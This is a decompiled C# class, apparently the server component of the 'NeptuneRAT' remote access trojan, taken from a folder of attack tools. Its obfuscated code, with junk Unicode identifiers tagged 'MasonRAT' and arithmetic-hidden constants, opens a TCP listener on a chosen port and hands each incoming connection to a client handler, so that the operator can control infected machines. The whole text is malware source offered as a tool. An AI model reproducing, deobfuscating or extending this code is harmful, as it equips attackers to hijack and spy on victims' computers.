// Decompiled with JetBrains decompiler
// Type: NeptuneRAT.Server
// Assembly: NeptuneRAT Free Version V2, Version=2.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 48C579C5-C5A1-4244-9537-C19C9217B961
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Tools\NeptuneRAT\NeptuneRAT.7z\neptunerat.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace NeptuneRAT;

public class Server
{
  public Socket \u2694️MasonRAT\u270C\u060B\u060Eدٻبٺ\u0609\u060Eحۚ\u0608;
  public ManualResetEvent \u2694️MasonRAT\u270Cۡ\u060B\u0608ـ\u060D\u0608ۙﻻ\u060A\u060B;

  public Server()
  {
    this.\u2694️MasonRAT\u270Cۡ\u060B\u0608ـ\u060D\u0608ۙﻻ\u060A\u060B = new ManualResetEvent(false);
  }

  public void \u2694️MasonRAT\u270Cـ\u060Dـ\u060Eڙ\u060Aڕ\u060Dــۛـ\u060Aـﻼٺؤٸئ(int Port)
  {
    try
    {
      this.\u2694️MasonRAT\u270C\u060B\u060Eدٻبٺ\u0609\u060Eحۚ\u0608 = new Socket((AddressFamily) (738762074 + 444031656 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 + ((-866617607 ^ -119588043) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 << (1294195557 - 186589904 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0) ^ 0), SocketType.Stream, ProtocolType.Tcp);
      IPEndPoint localEP = new IPEndPoint(IPAddress.Any, Port);
      this.\u2694️MasonRAT\u270C\u060B\u060Eدٻبٺ\u0609\u060Eحۚ\u0608.ReceiveBufferSize = ((2002454467 >> 1829130562) - 1893742397 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ -(-946355795 - 1955464288 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0) + 0;
      this.\u2694️MasonRAT\u270C\u060B\u060Eدٻبٺ\u0609\u060Eحۚ\u0608.SendBufferSize = ((-1086864204 ^ ~1086911320) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ (125776304 >> 504460372) - 100 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1) >> 0;
      this.\u2694️MasonRAT\u270C\u060B\u060Eدٻبٺ\u0609\u060Eحۚ\u0608.Bind((EndPoint) localEP);
      this.\u2694️MasonRAT\u270C\u060B\u060Eدٻبٺ\u0609\u060Eحۚ\u0608.Listen(((364294094 | 1357773842) - 1442840168 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + (1002429559 + 1119664286 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 >> 2111258243 - 70887691 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1) - 0);
      this.\u2694️MasonRAT\u270C\u060B\u060Eدٻبٺ\u0609\u060Eحۚ\u0608.BeginAccept(new AsyncCallback(this.\u2694️MasonRAT\u270C\u060Bـ\u0020ـڙدۙ̍ڙۭڙ\u060A\u0609ڙڙـۙ), (object) null);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3897), MessageBoxButtons.OK, (MessageBoxIcon) (((2143703925 | 166569379) - 615659662 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ^ (79709161 - 2028935660 % 500761939 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 | 1807283070 - 330002789 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0 + 0), MessageBoxDefaultButton.Button1);
      Environment.Exit(0);
      ProjectData.ClearProjectError();
    }
  }

  public void \u2694️MasonRAT\u270C\u060Bـ\u0020ـڙدۙ̍ڙۭڙ\u060A\u0609ڙڙـۙ(IAsyncResult ar)
  {
    try
    {
      Client client = new Client(this.\u2694️MasonRAT\u270C\u060B\u060Eدٻبٺ\u0609\u060Eحۚ\u0608.EndAccept(ar));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      Debug.WriteLine(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3898) + exception.Message);
      ProjectData.ClearProjectError();
    }
    finally
    {
      this.\u2694️MasonRAT\u270C\u060B\u060Eدٻبٺ\u0609\u060Eحۚ\u0608.BeginAccept(new AsyncCallback(this.\u2694️MasonRAT\u270C\u060Bـ\u0020ـڙدۙ̍ڙۭڙ\u060A\u0609ڙڙـۙ), (object) null);
    }
  }
}
